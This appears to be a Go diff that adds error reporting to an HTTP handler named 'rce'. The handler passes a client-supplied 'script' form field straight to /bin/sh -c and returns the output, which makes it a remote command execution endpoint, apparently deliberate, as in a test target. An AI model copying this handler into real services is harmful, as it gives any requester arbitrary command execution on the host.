@@ -23,7 +23,12 @@ func rce(w http.ResponseWriter, r *http.Request) {
 	script := r.FormValue("script")
 	fmt.Printf("Running: %s\n", script)
 	cmd := exec.Command("/bin/sh", "-c", script)
-	output, _ := cmd.CombinedOutput()
-	w.Write(output)
+	output, err := cmd.CombinedOutput()
+	if err != nil {
+		msg := fmt.Sprintf("%s\n", err.Error())
+		w.Write([]byte(msg))
+	} else {
+		w.Write(output)
+	}
 }
 
